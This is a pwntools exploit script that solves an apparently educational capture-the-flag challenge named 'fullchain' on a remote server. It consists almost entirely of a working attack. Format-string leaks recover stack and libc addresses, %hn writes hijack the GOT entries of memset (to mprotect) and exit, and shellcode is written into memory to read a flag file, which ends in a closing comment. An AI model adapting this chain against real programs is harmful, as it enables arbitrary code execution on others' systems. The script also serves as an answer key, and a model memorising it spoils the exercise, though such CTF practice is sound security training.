from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = ("./fullchain")
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#r = process('./fullchain')
r = remote("edu-ctf.zoolab.org", 30201)
#r = remote('fullchain_fullchain_1', 30201)

def connect(pos, act):
    r.recvuntil('> ')
    r.sendline(pos)
    r.recvuntil('> ')
    r.sendline(act)

# leak local address to calculate cnt address in order to modify the value of cnt
connect("local", "write%7$lx")
s = r.recvuntilS('global')
local_addr = int(s[5:-6], 16)
cnt_addr = local_addr - 0xc
ret_addr = local_addr - 0x18
# write cnt address into stack
connect("local", "read")
offset = 16
payload = b'A'*offset + p64(cnt_addr)
r.sendline(payload)
# modify cnt value to 5 (and the only number we can control is 5)
# contents in local = 14,15,16th parameters of printf
# cnt address is at 16th (which is written in the last phase)
# cnt = 5
connect("local", "write%16$n")

# retry
# write cnt address into stack
connect("local", "read")
offset = 16
payload = b'A'*offset + p64(cnt_addr)
r.sendline(payload)
# modify cnt value to any value
# contents in local = 14,15,16th parameters of printf
# [0:8], [8:16], [16:24]
# cnt address is at 16th (which is written in the last phase)
# cnt = 12
connect("global", "read")
payload = b"%150c%16$hhn"
r.sendline(payload)
connect("global", "write")


# leak __libc_csu_init address to calculate printf@got.plt address
connect("local", "write%8$lx")
s = r.recvuntilS('global')
__libc_csu_init_addr = int(s[5:-6], 16)
printf_got_plt_addr = __libc_csu_init_addr + 0x2848
# write printf@got.plt address into stack
connect("local", "read")
payload = b'A'*offset + p64(printf_got_plt_addr)
r.sendline(payload)
# read printf_got_plt_addr and get the value of printf's address
# calculate libc base address by printf address - printf offset
connect("local", "write%16$s")
s = r.recvuntil('global')
printf_addr = s[5:-6]
padding = 8 - len(printf_addr)
printf_addr += b'\x00'*padding
printf_addr = u64(printf_addr)
printf_offset = elf.symbols['printf']
libc_base_addr = printf_addr - printf_offset

# leak global address
connect("global", "read")
payload = b"%7$lx"
r.sendline(payload)
connect("global", "write")
s = r.recvuntilS('global')
global_addr = int(s[:-6], 16)

# write memset_got_plt address into stack
# use hn, so we need 4 times, each time 2 bytes
# Here only use 3 times because the first two bytes are 0
# GOT hijacking memset with mprotect
memset_got_plt_addr = printf_got_plt_addr+0x10
mprotect_addr = libc_base_addr + elf.symbols['mprotect']
connect("local", "read")
payload = b'A'*offset + p64(memset_got_plt_addr)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(mprotect_addr)[-4:],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")

connect("local", "read")
payload = b'A'*offset + p64(memset_got_plt_addr+2)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(mprotect_addr)[-8:-4],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")

connect("local", "read")
payload = b'A'*offset + p64(memset_got_plt_addr+4)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(mprotect_addr)[-12:-8],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")


# write exit_got_plt address into stack
# use hn, so we need 4 times, each time 2 bytes
# Here only use 3 times because the first two bytes are 0
# GOT hijacking exit with write
exit_got_plt = printf_got_plt_addr+0x28
write_addr = libc_base_addr + elf.symbols['write']
connect("local", "read")
payload = b'A'*offset + p64(exit_got_plt)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(write_addr)[-4:],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")

connect("local", "read")
payload = b'A'*offset + p64(exit_got_plt+2)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(write_addr)[-8:-4],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")

connect("local", "read")
payload = b'A'*offset + p64(exit_got_plt+4)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(write_addr)[-12:-8],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")

# write page_boundary to ptr
# since ptr will be polluted in the next loop, we only got one shot to write
# we only need to change the last two bytes which is available by hn
ptr_addr = cnt_addr+0x4
page_boundary = global_addr - 0xb0
connect("local", "read")
payload = b'A'*offset + p64(ptr_addr)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(page_boundary)[-4:],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")


# call myset to call memset, which is now mprotect, to change the attributes of the pages
# To avoid polluting the value of ptr, we need to send other value than global/local
# Since exit is hijacked as write the program won't crash
connect("dummy", "set")
r.recvuntil("> ")
r.sendline(str(0x1000))
r.recvuntil("> ")
r.sendline(str(7))


# write global address into stack
# start writing rop chain on global
shellcode = ""
filename = "/home/fullchain/flag"
shellcode += shellcraft.open(filename)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
sh = asm(shellcode)
# write 2 bytes at each time, start from global_addr+24
# preserve first 24 bytes of global_addr for further utilization
# scanf("24c") will add '\x00 at the end, so never use up 24 characters after this part
for i in range(0,len(sh),2):
    # overwrite should be little endian
    overwrite = (sh[i+1]<<8) + sh[i] # '\x0f\x05' -> 0x050f
    connect("local", "read")
    payload = b'A'*offset + p64(global_addr+24+i)
    r.sendline(payload)
    connect("global", "read")
    payload = "%"+str(overwrite)+"c%16$hn"
    r.sendline(payload)
    connect("global", "write")

# write exit_got_plt address into stack
# use hn, so we need 4 times, each time 2 bytes
# Here only use 3 times because the first two bytes are 0
# GOT hijacking exit with global address + 24
global_addr_24 = global_addr + 24
connect("local", "read")
payload = b'A'*offset + p64(exit_got_plt)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(global_addr_24)[-4:],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")

connect("local", "read")
payload = b'A'*offset + p64(exit_got_plt+2)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(global_addr_24)[-8:-4],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")

connect("local", "read")
payload = b'A'*offset + p64(exit_got_plt+4)
r.sendline(payload)
connect("global", "read")
overwrite = int(hex(global_addr_24)[-12:-8],16)
payload = "%" + str(overwrite) + "c%16$hn"
r.sendline(payload)
connect("global", "write")


# This time exit is hijacked as global address + 24 which stored the shellcode
# Trigger exit
r.recvuntil("> ")
r.sendline("dummy")
print(r.recv())

r.interactive()
#FLAG{Emperor_time}